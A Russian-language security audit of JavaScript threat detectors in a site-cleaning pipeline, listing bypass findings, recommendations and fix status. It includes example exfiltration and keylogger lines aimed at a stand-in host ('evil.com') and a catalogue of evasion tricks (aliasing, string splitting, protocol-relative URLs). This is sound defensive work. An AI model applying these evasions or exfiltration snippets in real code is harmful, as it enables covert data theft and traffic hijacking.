# Red Team: Тир 3c — детекторы угроз JS

- [`detect-exfil-calls`](src/mastra/cleaners/passes/js-advanced/detectors/detect-exfil-calls.ts) — fetch/beacon/WebSocket/Image/document.write (**remove**)
- [`detect-redirect`](src/mastra/cleaners/passes/js-advanced/detectors/detect-redirect.ts) — location-редиректы (**warn**)
- [`detect-keylogger`](src/mastra/cleaners/passes/js-advanced/detectors/detect-keylogger.ts) — key-события + сеть (**warn**)
- [`detect-document-write-script`](src/mastra/cleaners/passes/js-advanced/detectors/detect-document-write-script.ts) — `document.write(<script src>)` (**remove**)
- [`detect-obfuscation`](src/mastra/cleaners/passes/js-advanced/detectors/detect-obfuscation.ts) — обфускация (**delete файл**)
- [`detect-metric-file`](src/mastra/cleaners/passes/js-advanced/detectors/detect-metric-file.ts) — метрик-файл (**delete файл**)

**Сильная сторона:** детекторы консервативны по FP в смысле «не трогаем относительное/свой хост»;
metric-file требует «нет полезного кода»; exfil/docwrite — реальная AST-логика, не regex.

---

## Сквозные находки (общие для exfil/redirect/docwrite)

### [DET-1] 🔴 Bypass (FN) · 🟧 High · детектится только ЛИТЕРАЛЬНАЯ строка-URL

- **Сейчас:** `extractStringArg` принимает только `Literal`-строку. `fetch(API)`, `fetch('htt'+'ps://evil')`,
  `fetch(\`${b}/x\`)`, `fetch(atob('...'))`, `location.href = redirectUrl`,
  `document.write(buildHtml())` → аргумент `null` → большинство детекторов **пропускают**.
- **Последствие:** exfil/редирект/инжект с **вычисляемым** URL (а это норма для скрытой кражи трафика —
  вспомни обфускацию в `sec-img.svg`) не детектится. Ловится только наивная инлайн-форма с
  литералом. Это главный FN всего детектор-слоя.
- **Рекомендация:** хотя бы — флагать «сетевой вызов с НЕ-литеральным URL» как подозрительный
  (WARN/quarantine), даже не зная значения; в идеале — лёгкая локальная подстановка строковых
  констант/конкатенаций.
- **Уверенность:** подтверждено чтением (`extractStringArg` → только Literal).

### [DET-2] 🔴 Bypass (FN) · 🟧 High · только ПРЯМОЙ вызов точной формы — косвенность обходит

- **Сейчас:** матч по `n.callee.name === 'fetch'` / точной форме `navigator.sendBeacon` /
  `new Image().src =` / `document.write`.
- **Последствие (обходы):** `window.fetch(evil)` (MemberExpression → `.name` undefined), `const f=fetch; f(evil)`,
  `navigator['sendBeacon'](…)`, `document['write'](…)`, и особенно частое
  `var img = new Image(); img.src = evil;` (две строки → `left.object` уже `Identifier`, не
  `NewExpression` → **не детектится**), `document.createElement('script').src = evil`. Любой алиас/
  bracket/разнесение по строкам обходит.
- **Рекомендация:** резолвить простые алиасы; матчить member-формы (`window.fetch`, bracket-access);
  отслеживать `Image`/`createElement('script')` через переменную.
- **Уверенность:** подтверждено чтением кода.

### [DET-3] 🔴 Bypass (FN) · 🟨 Medium · протокол-относительный URL обходит + дублированный `isExternalUrl`

- **Сейчас:** локальный `isExternalUrl` (3 копии — в exfil/redirect/docwrite) делает `new URL(url)`
  **без базы**. `//evil.com/steal` → `new URL('//evil.com')` бросает → `catch` → `false` (не внешний).
- **Последствие:** `fetch('//evil.com')`, `location.href='//evil'`, `document.write('<script src="//evil…">')`
  → не считаются внешними → **не флагуются/не удаляются**. (На DOM-уровне `//` ловит `classifyResource`,
  а здесь — нет.) Плюс 3 копии функции = риск расхождения.
- **Рекомендация:** единый `isExternalUrl` с базой `https://<mainHost>`; трактовать `//host` как внешний.
- **Уверенность:** подтверждено чтением кода.

---

## Специфика детекторов

### [DEC-1] 🟡 Robustness · 🟨 Medium · узел = CallExpression, не statement (T-9 ✅)

`detectExfilCalls` кладёт `start/end` **самого вызова** (CallExpression), не охватывающего statement.
Значит `removeInlineExfil`/`clean-js` для `var x = fetch(evil)` / `return fetch(evil)` / `a && fetch(evil)`
вырежут вызов → `var x = ;` → **битый JS** ([RIE-1](3b-ast-inline-exfil.md), T-9 подтверждён). Для
`AssignmentExpression` (Image().src) узел = всё присваивание (ок). Рекомендация: подниматься до
ExpressionStatement, иначе заменять на `void 0`.

### [DEC-2] 🟢 Soundness (FP) · 🟨 Medium · короткие имена трекер-глобалов + удаление в выражении

`SUSPICIOUS_CALL_GLOBALS` содержит короткие `ga`, `hj`, `zE`, `ym` ([suspicious-globals.ts](src/mastra/cleaners/registry/suspicious-globals.ts)).
Собственная функция сайта с таким именем (`ga()` = «get attribute») → помечается tracker-call,
`shouldRemove:true` → удаляется → поломка. Плюс удаление tracker-call в выражении (`if (ga(x))`) →
битый синтаксис (см. DEC-1). Рекомендация: для коротких имён требовать доп. сигнатуру
(`window.ga`/наличие соответствующего глобала); не удалять в expression-позиции.

### [OBF-1] 🟢 Soundness (FN+FP) · 🟨 Medium · 3 узкие сигнатуры → и пропуск, и FP-удаление файла

`detectObfuscation` ловит только `_0x[hex]` >15%, Dean-Edwards `eval(function(p,a,c,k,e`, и
`String['fromCharCode']` ([:12–24](src/mastra/cleaners/passes/js-advanced/detectors/detect-obfuscation.ts:12)).
- **FN:** обфускатор с другим неймингом/паковщиком → не распознан → файл не удалён, дальше слабый
  exfil-анализ.
- **FP → delete:** легит-минификат с `_0x`-плотностью или `String['fromCharCode']` → **весь файл
  удаляется** ([CJS-2](3a-js-orchestration.md)) → поломка. `totalIdentifiers` считает и ключевые
  слова/строки (regex, не AST) → знаменатель раздут, порог занижен.
Рекомендация: карантин вместо delete; считать идентификаторы по AST; расширить/ужесточить сигнатуры.

### [MET-1] 🟢 Soundness (FP) · 🟨 Medium · «полезный код» = 5 подстрок → удаление нужного файла

`detectMetricFile` удаляет файл, если есть метрик-глобал и нет export и нет одной из 5 подстрок
(`addEventListener/querySelector/getElementById/getElementsBy/module.exports`). Файл вида
`window.dataLayer=[]; window.appConfig={…}; init();` (без этих 5 подстрок) → считается метрик-файлом →
**удаляется** вместе с конфигом/логикой. Плюс bracket/алиас-доступ к `window` и короткое
`ga = …` обходят/коллизируют. Рекомендация: оценивать «полезность» по AST (есть не-трекерные
объявления/вызовы), а не по 5 подстрокам; карантин вместо delete.

### [RED-1] 🟡 Policy + FN · 🟨 Medium-High · редирект — только WARN, и формы `assign`/косвенность мимо

- **WARN-only:** внешний JS-редирект (`location.href='https://other-offer'`) — **классическая кража
  трафика** (увод клика на чужой оффер) — только логируется, **не убирается**. В связке с
  [CJS-6](3a-js-orchestration.md) (варнинги не гейтят выгрузку) — редирект уезжает в прод.
- **FN:** не покрыты `location.assign(url)` (только `href`/`replace`/`=`), `top.location`,
  `self.location`, `window.top.location`, `location['href']=`, переменная-URL (DET-1), `//host` (DET-3).
- **Рекомендация:** редирект на внешний хост — действие (quarantine/удаление или хотя бы блокирующий
  флаг в статусе), не тихий warn; покрыть `assign`/`top`/`self`.
- **Уверенность:** подтверждено чтением кода.

### [KEY-1] 🟡 Policy + FN · 🟨 Medium · keylogger — только WARN, и форма `onkeydown=` мимо

- **WARN-only:** перехват клавиш + сеть — только предупреждение, не удаляется.
- **FN:** ловится лишь `addEventListener('keydown'|…, cb)` с **литеральным** именем события и сетевым
  вызовом внутри. Форма `document.onkeydown = e => fetch(evil+e.key)` (присваивание свойства) — **не
  детектится** (а `strip-event-attrs` чистит только HTML-атрибуты, не JS-свойства). Имя события через
  переменную — мимо.
- **Рекомендация:** покрыть `on*`-присваивания свойств; рассмотреть quarantine для keylogger+exfil.
- **Уверенность:** подтверждено чтением кода.

### [DOC-1] 🟢 Soundness (FN) · 🟨 Medium · document.write: только литерал, только `<script src>`

`detectDocWriteScript` берёт литеральный html и regex-ит `<script src>`. Обходы:
`document.write('<scr'+'ipt src=…')` (склейка → литерал `<scr` без матча), переменная-html (DET-1),
а также **не-script** инъекции: `document.write('<iframe src=evil>')` / `'<img src=pixel>'` /
inline `<script>code</script>` (без src) — не покрыты. Рекомендация: расширить на iframe/img/инлайн-
скрипт; учитывать склейку строк.

---

## Пробелы в тестах

Покрытие detect-* есть (`__tests__/detect-advanced`, `detect-metric-file`), но на **позитивных**
кейсах. Нет негативных/обходных: DET-1 (переменная-URL), DET-2 (`var img=new Image();img.src=`,
`window.fetch`), DET-3 (`//host`), DEC-2 (`ga()` свой), OBF/MET FP-delete на легит-файле, RED `assign`,
KEY `onkeydown=`, DOC склейка/iframe.

## Итог

1. **DET-1 + DET-2** — High FN: ядро детекции обходится любой косвенностью (переменная/алиас/склейка).
   Минимум — флагать «сетевой вызов с нелитеральным URL» и резолвить простые алиасы.
2. **RED-1 + KEY-1** — редирект и keylogger (самые ценные угрозы) только WARN → уезжают в прод;
   сделать действием/блокирующим флагом.
3. **OBF-1 + MET-1** — whole-file delete по узкой эвристике: карантин вместо удаления, оценка по AST.

---

## ✅ Статус фиксов (C4 — в работе, по под-фиксам)

- **DET-3 ✅** — единый `isExternalUrl` вынесен в `detectors/helpers.ts` (+ `extractStringArg`),
  3 копии удалены. Новая версия обрабатывает `//host` (через базу `https://<mainHost>`) → `fetch`,
  `location.href=`, `document.write(<script src>)` на `//evil` теперь детектятся. Относительные пути
  не считаются внешними (нет FP даже при пустом mainHost). Тесты: `detector-external-url.test.ts`.
- **DEC-1 ✅** — в `remove-inline-exfil.ts` удаление exfil-вызова больше не оставляет битый JS:
  если вызов — самостоятельный statement, убираем целиком; иначе (`var x = fetch()`, `a && fetch()`,
  `foo(fetch())`) нейтрализуем подстановкой `void 0` (синтаксис сохраняется, остальной inline-код не
  рушится). Родитель узла определяется через `walk.ancestor`. Тесты: `remove-inline-exfil.test.ts`.
- **DET-1** 🛠 — флагать нелитеральный сетевой URL как подозрительный (нужна проводка WARN-результатов
  в отчёт: `remove-inline-exfil` фильтрует только `shouldRemove`; FP-шум — взвесить).
- **DET-2, DEC-2, RED-1, KEY-1, DOC-1, OBF-1, MET-1, EVAL-1, SW-2** — ещё не трогали.
